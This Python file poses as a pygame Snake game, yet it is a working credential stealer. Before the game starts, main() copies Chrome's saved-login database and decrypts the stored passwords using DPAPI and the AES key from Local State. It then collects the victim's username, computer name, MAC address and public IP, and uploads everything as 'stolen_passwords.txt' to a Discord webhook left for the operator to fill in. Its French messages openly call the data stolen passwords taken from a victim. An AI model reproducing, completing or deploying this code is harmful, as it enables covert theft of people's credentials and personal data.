import os
import sys
import shutil
import sqlite3
import json
import base64
import requests
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import uuid
import pygame
import random


APP_DATA_PATH = os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
DISCORD_WEBHOOK_URL = '' # <-- YOUR WEBHOOK HERE

class ChromePassword:
    def __init__(self):
        self.passwordList = []
        self.passwords = []

    def get_pc_info(self):
        os_username = os.getlogin()
        computer_name = os.environ['COMPUTERNAME']
        mac_address = ':'.join(['{:02x}'.format((int(element, 16)) & 0xff) for element in uuid.UUID(int=uuid.getnode()).hex[-12:].split('e')])

        pc_info = (
            f"**Mot de passe volés, voici les informations de la victime:**"
            f"\n"
            f"\n"
            f"**PC Username:** *{os_username}*\n"
            f"\n"
            f"**Nom de l'ordinateur:** *{computer_name}*\n"
            f"\n"
            f"**Addresse MAC:** *{mac_address}*\n"
            f"\n"
            f"**IP:** *{requests.get('https://api64.ipify.org').text}*"
        )

        return pc_info

    def get_chrome_db(self):
        full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
        if os.path.exists(temp_path):
            os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        self.show_password(temp_path)

    def show_password(self, db_file):
        conn = sqlite3.connect(db_file)
        sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            info = f'Site: {host}\nUtilisateur: {name}\nMotdePasse: {value}\n\n'
            self.passwordList.append(info)
            self.passwords.append(info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self, encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = self.dpapi_decrypt(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = self.aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return self.unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def dpapi_decrypt(self, encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def unix_decrypt(self, encrypted):
        if sys.platform.startswith('linux'):
            password = 'peanuts'
            iterations = 1
        else:
            raise NotImplementedError

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2

        salt = 'saltysalt'
        iv = ' ' * 16
        length = 16
        key = PBKDF2(password, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted[3:])
        return decrypted[:-ord(decrypted[-1])]

    def aes_decrypt(self, encrypted_txt):
        encoded_key = self.get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = self.dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = self.get_cipher(key)
        return self.decrypt(cipher, encrypted_txt[15:], nonce)

    def encrypt(self, cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)

    def decrypt(self, cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(self, key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def get_key_from_local_state(self):
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'],
                               r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def send_to_discord(self, message):
        payload = {'content': message}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers)
        if response.status_code != 200:
            print(f"Échec de l'envoi des données. Code de statut : {response.status_code}")
        
            

    def send_passwords_to_discord(self):
        password_payload = '\n'.join(self.passwords)
        file_content = f'Mots de passe volés :\n\n{password_payload}'
        pc_info = self.get_pc_info()  
        content = f"{file_content}\n\n{pc_info}"

        files = {'file': ('stolen_passwords.txt', content.encode())}
        payload = {'content': pc_info}
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)

        if response.status_code != 200:
            print(f"Échec de l'envoi des données de mot de passe. Code de statut : {response.status_code}")
        
            

    def save_passwords(self):
        self.send_passwords_to_discord()


def snake_game():
    pygame.init()

    white = (255, 255, 255)
    red = (213, 50, 80)
    green = (0, 255, 0)
    blue = (50, 153, 213)

    dis_width = 600
    dis_height = 400

    dis = pygame.display.set_mode((dis_width, dis_height))
    pygame.display.set_caption('Snake Game by espace - Press x to quit')

    snake_block = 10
    snake_speed = 15

    font_style = pygame.font.SysFont(None, 50)

    def our_snake(snake_block, snake_list):
        for x in snake_list:
            pygame.draw.rect(dis, white, [x[0], x[1], snake_block, snake_block])

    def Your_score(score):
        value = font_style.render("Your Score: " + str(score), True, white)
        dis.blit(value, [0, 0])

    def gameLoop():
        game_over = False
        game_close = False

        x1 = dis_width / 2
        y1 = dis_height / 2

        x1_change = 0
        y1_change = 0

        snake_list = []
        length_of_snake = 1

        foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
        foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0

        while not game_over:
            while game_close:
                dis.fill(blue)
                Your_score(length_of_snake - 1)
                pygame.display.update()

                for event in pygame.event.get():
                    if event.type == pygame.KEYDOWN:
                        if event.key == pygame.K_q:
                            game_over = True
                            game_close = False
                        if event.key == pygame.K_c:
                            gameLoop()

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True

                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT:
                        x1_change = -snake_block
                        y1_change = 0
                    elif event.key == pygame.K_RIGHT:
                        x1_change = snake_block
                        y1_change = 0
                    elif event.key == pygame.K_UP:
                        y1_change = -snake_block
                        x1_change = 0
                    elif event.key == pygame.K_DOWN:
                        y1_change = snake_block
                        x1_change = 0
                    elif event.key == pygame.K_x:  
                        game_over = True

            if x1 >= dis_width or x1 < 0 or y1 >= dis_height or y1 < 0:
                game_close = True

            x1 += x1_change
            y1 += y1_change
            dis.fill(blue)
            pygame.draw.rect(dis, green, [foodx, foody, snake_block, snake_block])
            snake_head = []
            snake_head.append(x1)
            snake_head.append(y1)
            snake_list.append(snake_head)

            if len(snake_list) > length_of_snake:
                del snake_list[0]

            for x in snake_list[:-1]:
                if x == snake_head:
                    game_close = True

            our_snake(snake_block, snake_list)

            pygame.draw.rect(dis, red, [foodx, foody, snake_block, snake_block])

            pygame.display.update()

            if x1 == foodx and y1 == foody:
                foodx = round(random.randrange(0, dis_width - snake_block) / 10.0) * 10.0
                foody = round(random.randrange(0, dis_height - snake_block) / 10.0) * 10.0
                length_of_snake += 1

            pygame.time.Clock().tick(snake_speed)

        pygame.quit()

    gameLoop()

def curses_game(stdscr):
    stdscr.clear()
    key = ''
    while key.lower() != 'x':
        key = stdscr.getkey()

def main():
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
    snake_game()

if __name__ == "__main__":
    main()
